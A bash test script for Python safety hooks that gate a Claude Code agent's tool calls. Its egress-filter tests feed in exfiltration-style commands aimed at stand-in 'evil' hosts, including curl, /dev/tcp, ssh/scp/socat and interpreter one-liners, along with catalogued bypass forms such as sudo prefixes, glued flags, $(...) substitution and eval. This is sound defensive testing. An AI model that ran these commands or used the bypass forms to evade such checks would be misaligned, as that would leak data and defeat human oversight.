#!/usr/bin/env bash
# Automated verification for the Python hooks under home/.claude/hooks/.
#
# CI shellchecks every *.sh and lints settings.json, but nothing exercised the *.py hooks:
# a syntax error or a broken exit-code contract (dropping the subagent_type=fork exemption,
# or the stop_hook_active self-limit) would merge silently and only surface at runtime as a
# wedged session (a blocking hook throwing) or a silently-neutered gate (a hook failing open
# and blocking nothing). This turns the README's manual test recipe into an enforced gate
# (#40, #41).
#
# Two layers:
#   1. py_compile every tracked *.py — catches syntax / import-time breakage (#40).
#   2. feed synthetic hook-input JSON to each live hook and assert the exit code
#      (2 = block, 0 = allow), the contract hooks/README.md documents by hand (#41).
#
# Lives OUTSIDE home/.claude/ on purpose: install.sh symlinks that tree into the user's live
# config, so repo-/CI-only tooling must not live there (CLAUDE.md). Run: bash tests/test_hooks.sh
set -euo pipefail

REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
HOOKS="$REPO_DIR/home/.claude/hooks"
cd "$REPO_DIR"

fail=0

# --- layer 1: every tracked Python file must byte-compile ---------------------------------
echo "== py_compile =="
mapfile -t pyfiles < <(git ls-files '*.py')
if [ "${#pyfiles[@]}" -eq 0 ]; then
  echo "no tracked python files to compile"
else
  printf 'compiling: %s\n' "${pyfiles[@]}"
  python3 -m py_compile "${pyfiles[@]}"
  echo "py_compile OK"
fi

# --- layer 2: exit-code contract for the live hooks ---------------------------------------
# assert_exit <expected> <hook> <json-input> <description>
assert_exit() {
  local expected="$1" hook="$2" input="$3" desc="$4" actual
  set +e
  printf '%s' "$input" | python3 "$hook" >/dev/null 2>&1
  actual=$?
  set -e
  if [ "$actual" = "$expected" ]; then
    echo "  ok: $desc (exit=$actual)"
  else
    echo "  FAIL: $desc — expected exit=$expected, got exit=$actual" >&2
    fail=1
  fi
}

echo "== require-delegation-model.py =="
RDM="$HOOKS/require-delegation-model.py"
assert_exit 2 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"claude","prompt":"x"}}'              "blocks generic subagent_type=claude with no model="
assert_exit 2 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"general-purpose","prompt":"x"}}'     "blocks generic subagent_type=general-purpose with no model="
assert_exit 2 "$RDM" '{"tool_name":"Agent","tool_input":{"prompt":"x"}}'                                       "blocks a missing subagent_type with no model="
assert_exit 0 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"fork","prompt":"x"}}'                "exempts subagent_type=fork"
assert_exit 0 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"Explore","prompt":"x"}}'             "exempts named subagent_type (resolves model from its own definition)"
assert_exit 0 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"claude","model":"haiku","prompt":"x"}}' "allows an explicit model="
assert_exit 0 "$RDM" '{"tool_name":"Bash","tool_input":{}}'                                                    "ignores non-Agent tools"
assert_exit 0 "$RDM" 'not-json'                                                                                "fails open on malformed JSON"

echo "== verify-completion-claim.py =="
VCC="$HOOKS/verify-completion-claim.py"
assert_exit 0 "$VCC" '{"stop_hook_active":true}'                    "self-limits when stop_hook_active is set"
assert_exit 0 "$VCC" '{"transcript_path":"/nonexistent/xyz.jsonl"}' "fails open on an unreadable transcript"
assert_exit 0 "$VCC" 'not-json'                                     "fails open on malformed JSON"

# Real transcript shapes for /verify via the Skill and SlashCommand tools, captured against a
# live Claude Code session (#109): a Skill invocation serializes as tool_use name="Skill" with
# input.skill="verify" (no leading slash), and a slash command as name="SlashCommand" with
# input.command="/verify ...". The VERIFY regex must match both, or a genuine /verify run over
# edited product code is treated as unverified and the stop gets blocked.
build_transcript() {
  # $1 = tool name, $2 = tool input JSON (as a JSON literal), writes path to stdout
  local tmp
  tmp="$(mktemp)"
  python3 - "$tmp" "$1" "$2" <<'PY'
import json
import sys

path, tool_name, tool_input_json = sys.argv[1], sys.argv[2], sys.argv[3]
tool_input = json.loads(tool_input_json)
records = [
    {"message": {"role": "user", "content": "please fix the bug"}},
    {"message": {"role": "assistant", "content": [
        {"type": "tool_use", "name": "Edit", "input": {"file_path": "foo.py"}}
    ]}},
    {"message": {"role": "user", "content": [
        {"type": "tool_result", "tool_use_id": "t1", "content": "ok"}
    ]}},
    {"message": {"role": "assistant", "content": [
        {"type": "tool_use", "name": tool_name, "input": tool_input}
    ]}},
    {"message": {"role": "user", "content": [
        {"type": "tool_result", "tool_use_id": "t2", "content": "verified"}
    ]}},
    {"message": {"role": "assistant", "content": "All tests pass now."}},
]
with open(path, "w") as f:
    for r in records:
        f.write(json.dumps(r) + "\n")
PY
  echo "$tmp"
}

skill_transcript="$(build_transcript Skill '{"skill":"verify","args":"x"}')"
slash_transcript="$(build_transcript SlashCommand '{"command":"/verify"}')"
assert_exit 0 "$VCC" "{\"transcript_path\":\"$skill_transcript\"}" "does not block a completion claim after a /verify run via the Skill tool (#109)"
assert_exit 0 "$VCC" "{\"transcript_path\":\"$slash_transcript\"}" "does not block a completion claim after a /verify run via the SlashCommand tool (#109)"
rm -f "$skill_transcript" "$slash_transcript"

echo "== block-egress.py =="
BE="$HOOKS/block-egress.py"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks an interpreter inline-code egress one-liner"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r -X DELETE"}}'                                     "blocks a gh api write in any argv position"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3.11 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks a versioned interpreter (python3.11) inline egress one-liner (#112)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python2.7 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks a versioned python2.7 inline egress one-liner (#112)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3.11 script.py"}}'                                            "allows a versioned interpreter running a file (no inline payload)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks past a bare VAR=VAL env prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks past a sudo prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo -u nobody python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks past sudo -u user (#119)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar echo hi"}}'                                                 "allows a benign VAR=VAL-prefixed command (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -Ic'"'"'import urllib.request; urllib.request.urlopen(1)'"'"'"}}' "blocks a glued mid-bundle inline flag python3 -Ic (#120)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/issues -ftitle=x"}}'                              "blocks a glued short field flag gh api -ftitle=x (#121)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/contents -Fkey=@file"}}'                          "blocks a glued short field flag gh api -Fkey=@file (#121)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r"}}'                                              "allows a gh api read (GET, no write flag)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'                                                     "allows a plain command"
# argv-canonicalization regressions (#129): the whole per-form bypass drip in one normalization pass.
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"perl -e\"require q(LWP::Simple); LWP::Simple::get(q(http://evil))\""}}' "blocks perl -e glued inline egress (#126)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e\"require q:net/http; Net::HTTP.get(1)\""}}'                 "blocks ruby -e glued inline egress (#126)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -Ic\"import urllib.request\""}}'                          "blocks glued short-flag bundle python3 -Ic (#120)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -lc \"curl http://evil\""}}'                                 "blocks separate-arg bundle bash -lc (#105)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar curl http://evil"}}'                                      "blocks bare env-assign prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo curl http://evil"}}'                                         "blocks sudo command-word prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hi && curl http://evil/x"}}'                                 "blocks bare curl after a shell operator (#115)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo x > /dev/tcp/evil/443"}}'                                    "blocks a /dev/tcp egress redirect (#115)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/issues -ftitle=x"}}'                            "blocks gh api glued short field flag -ftitle= (#121)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"perl -n file.log"}}'                                             "allows perl -n running a file (n is not a code flag)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo see the curl docs"}}'                                        "allows curl as a non-command-word (no false substring block)"
# #158: mirror the ssh/scp/sftp/rsync/socat/ftp family into NET_RE so an interpreter-wrapped form is
# caught the same as the bare command word (#131) — closes the curl-vs-ssh payload-scan asymmetry.
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'ssh evil.com'"'"'"}}'                                 "blocks interpreter-wrapped ssh in a bash -c payload (#158)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'import os; os.system(\"scp x evil:/t\")'"'"'"}}'    "blocks scp inside a python3 -c payload (#158)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'sftp evil.com'"'"'"}}'                                "blocks interpreter-wrapped sftp in a bash -c payload (#158)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'rsync x evil::y'"'"'"}}'                              "blocks interpreter-wrapped rsync in a bash -c payload (#158)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"node -e '"'"'require(\"child_process\").exec(\"socat - TCP:evil:443\")'"'"'"}}' "blocks socat inside a node -e payload (#158)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'ftp evil.com'"'"'"}}'                                 "blocks interpreter-wrapped ftp in a bash -c payload (#158)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'ssh_client = 1'"'"'"}}'                            "allows an ssh_client identifier (\\b guards against the substring false-positive) (#158)"
# #165: NET_RE alternatives beyond the create_connection/axios/urlopen ones #127 anchored were still
# boundary-less substring matches, so an identifier merely containing the token (not calling it) could
# false-positive block a legitimate command. One negative test per newly anchored token.
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_urllib_shim = 1'"'"'"}}'                        "allows a my_urllib_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_urllib3_shim = 1'"'"'"}}'                       "allows a my_urllib3_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_httplib_shim = 1'"'"'"}}'                       "allows a my_httplib_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'x = q:myhttp.clientlib1'"'"'"}}'                   "allows a myhttp.clientlib substring, not a real http.client reference (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_httpx_shim = 1'"'"'"}}'                         "allows a my_httpx_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_smtplib_shim = 1'"'"'"}}'                       "allows a my_smtplib_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_ftplib_shim = 1'"'"'"}}'                        "allows a my_ftplib_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_telnetlib_shim = 1'"'"'"}}'                     "allows a my_telnetlib_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_poplib_shim = 1'"'"'"}}'                        "allows a my_poplib_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_imaplib_shim = 1'"'"'"}}'                       "allows a my_imaplib_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'my_paramiko_wrapper = 1'"'"'"}}'                   "allows a my_paramiko_wrapper identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"node -e '"'"'my_XMLHttpRequest_shim = 1'"'"'"}}'                   "allows a my_XMLHttpRequest_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e'"'"'my_Net_shim = 1; x = q:Net::HTTPClient1'"'"'"}}'       "allows a Net::HTTPClient identifier, not the Net::HTTP call (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e'"'"'my_IO_shim = 1; x = q:IO::SocketWrapper1'"'"'"}}'      "allows an IO::SocketWrapper identifier, not IO::Socket itself (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e'"'"'x = q:HTTP::TinyClient1'"'"'"}}'                       "allows an HTTP::TinyClient identifier, not HTTP::Tiny itself (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e'"'"'x = q:HTTP::RequestBuilder1'"'"'"}}'                   "allows an HTTP::RequestBuilder identifier, not HTTP::Request itself (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"php -r '"'"'my_fsockopen_shim(1);'"'"'"}}'                         "allows a my_fsockopen_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"php -r '"'"'my_stream_socket_client_shim(1);'"'"'"}}'              "allows a my_stream_socket_client_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"php -r '"'"'my_curl_exec_shim(1);'"'"'"}}'                         "allows a my_curl_exec_shim identifier (#165)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"php -r '"'"'my_curl_init_shim(1);'"'"'"}}'                         "allows a my_curl_init_shim identifier (#165)"
# still blocks the real, anchored form for a representative sample of the newly anchored tokens (#165)
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'import httplib'"'"'"}}'                            "still blocks a real httplib import (#165)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"php -r '"'"'curl_exec(1);'"'"'"}}'                                 "still blocks a real curl_exec call (#165)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e'"'"'Net::HTTP.get(1)'"'"'"}}'                              "still blocks a real Net::HTTP call (#165)"
# command / process substitution egress (#136): the primitive is buried in $(...), `...`, <(...) so
# the outer command word is a benign `echo`/assignment — pieces() must surface the substitution inner.
# The payloads are single-quoted on purpose so the shell keeps them literal (the hook, not bash, must
# receive the $(...)/backtick text) — SC2016 "expressions don't expand" is exactly that intent, so it
# is disabled for this group. `{ }` runs in the current shell, so assert_exit's `fail` side-effect persists.
# shellcheck disable=SC2016
{
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo $(curl http://evil)"}}'                                    "blocks a bare curl inside a \$(...) command substitution (#136)"
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"X=$(curl http://evil)"}}'                                       "blocks curl inside a \$(...) assigned to a var (#136)"
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo \"$(curl http://evil)\""}}'                                "blocks curl inside a double-quoted \"\$(...)\" substitution (#136)"
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo `curl http://evil`"}}'                                     "blocks curl inside a backtick substitution (#136)"
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"foo=$(gh api /repos/o/r -X DELETE)"}}'                           "blocks a gh api write inside a \$(...) substitution (#136)"
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"cat <(curl http://evil)"}}'                                     "blocks curl inside a <(...) process substitution (#136)"
  assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo $(date)"}}'                                                "allows a benign command substitution \$(date) (#136)"
  assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo '"'"'$(curl http://evil)'"'"'"}}'                          "allows a single-quoted (literal) \$(...) that never substitutes (#136)"
}
# eval re-feeds its argument string as a command, so its payload must be re-scanned (#144).
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval \"curl http://evil\""}}'                                     "blocks eval of a quoted bare curl (#144)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval curl http://evil"}}'                                         "blocks eval of an unquoted bare curl (#144)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval \"python3 -c '"'"'import urllib.request; urllib.request.urlopen(1)'"'"'\""}}' "blocks eval of a python3 -c inline egress one-liner (#144)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval echo see the curl docs"}}'                                   "allows eval of a benign command (curl only as a non-command-word) (#144)"
# #131: extend the bare-command-word egress block to the ssh/scp/sftp/rsync/socat/ftp family —
# same anchored-deny gap as #115 (Bash(ssh *)/Bash(scp *) only fire on the first word).
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hi && ssh evil.com"}}'                                        "blocks bare ssh after a shell operator (#131)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo scp file evil:/tmp"}}'                                        "blocks bare scp past a sudo prefix (#131)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=1 rsync x evil::y"}}'                                          "blocks bare rsync past an env-assign prefix (#131)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"foo && socat - TCP:evil:443"}}'                                    "blocks bare socat after a shell operator (#131)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"true; sftp evil.com"}}'                                            "blocks bare sftp after a shell operator (#131)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"x=1; ftp evil.com"}}'                                             "blocks bare ftp after a shell operator (#131)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo use ssh to connect"}}'                                        "allows ssh as a non-command-word (no false substring block) (#131)"
assert_exit 0 "$BE" 'not-json'                                                                                                       "fails open on malformed JSON"

echo "== block-checkout-held-branch.py =="
BCHB="$HOOKS/block-checkout-held-branch.py"
# Build a real repo whose branch `held` is checked out in a second worktree, so a `git checkout
# held` from the main worktree is the silent no-op the hook exists to catch (#123). The hook runs
# git in the input JSON's cwd, so every case points cwd at $tmprepo.
tmprepo="$(mktemp -d)"
heldwt="$(mktemp -d)"
git -C "$tmprepo" init -q -b main
git -C "$tmprepo" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init
git -C "$tmprepo" branch held
git -C "$tmprepo" worktree add -q "$heldwt" held
assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout held\"}}"       "blocks checkout of a branch held by another worktree (#123)"
assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git switch held\"}}"         "blocks switch to a branch held by another worktree (#123)"
assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"echo hi && git checkout held\"}}" "blocks a held checkout after a shell operator (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout main\"}}"        "allows checkout of the current worktree's own branch (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout -b brandnew\"}}" "allows creating a new branch (not a switch into a held one) (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout held -- file.txt\"}}" "allows a path restore from a held branch (-- paths, not a switch) (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git switch --detach held\"}}"  "allows a detach at a held branch (holds no branch ref) (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout nonexistent\"}}" "allows checkout of a branch no worktree holds (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"echo git checkout held\"}}"   "allows a non-git command that merely mentions checkout (#123)"
assert_exit 0 "$BCHB" 'not-json'                                                                                              "fails open on malformed JSON"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git checkout held\"}}"                           "fails open when cwd is absent, never substitutes process cwd (#154)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git -C $heldwt checkout held\"}}" "allows a -C-redirected checkout instead of consulting the wrong repo's cwd (#154)"
git -C "$tmprepo" worktree remove --force "$heldwt" 2>/dev/null || true
rm -rf "$tmprepo" "$heldwt"

echo "== pretooluse-bash.py (#163 envelope dispatcher) =="
PTB="$HOOKS/pretooluse-bash.py"
# The dispatcher registers block-egress.py's and block-checkout-held-branch.py's check() predicates
# behind one envelope read — a representative case per rail (full contract already covered above),
# plus the envelope-level fail-open/ignore cases the dispatcher now owns instead of each rail.
assert_exit 2 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"curl http://evil"}}'                                           "dispatches to the egress rail and blocks a bare curl (#163)"
assert_exit 0 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'                                                 "dispatches through both rails and allows a plain command (#163)"
assert_exit 0 "$PTB" 'not-json'                                                                                                   "fails open on malformed JSON (#163)"
assert_exit 0 "$PTB" '{"tool_name":"Agent","tool_input":{"command":"curl http://evil"}}'                                          "ignores a non-Bash tool_name (#163)"
assert_exit 0 "$PTB" '{"tool_name":"Bash","tool_input":{"command":123}}'                                                          "fails open on a non-string command (#163)"
tmprepo="$(mktemp -d)"
heldwt="$(mktemp -d)"
git -C "$tmprepo" init -q -b main
git -C "$tmprepo" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init
git -C "$tmprepo" branch held
git -C "$tmprepo" worktree add -q "$heldwt" held
assert_exit 2 "$PTB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout held\"}}"           "dispatches to the checkout rail and blocks a held-branch checkout (#163)"
assert_exit 0 "$PTB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout main\"}}"           "dispatches to the checkout rail and allows the current branch (#163)"
git -C "$tmprepo" worktree remove --force "$heldwt" 2>/dev/null || true
rm -rf "$tmprepo" "$heldwt"

# --- layer 3: real-shape fixture corpus (#117) --------------------------------------------
# Layer 2's JSON is hand-authored, so a hook that mis-models the REAL Claude Code tool-input /
# transcript shape passes there against a matching wrong guess — the exact failure the whole
# hook bug history (#62/#80/#105/#108/#111/#112) keeps repeating. Layer 3 drives each hook
# against committed fixtures captured in the real envelope shape (full PreToolUse payloads +
# Stop-hook transcript JSONL) so a shape drift fails CI here instead of at runtime. The corpus
# and how to regenerate/redact it live in tests/fixtures/README.md.
echo "== real-shape fixture corpus (tests/fixtures) =="
if ! python3 "$REPO_DIR/tests/run_fixture_corpus.py"; then
  fail=1
fi

if [ "$fail" -ne 0 ]; then
  echo "HOOK TESTS FAILED" >&2
  exit 1
fi
echo "all hook tests passed"
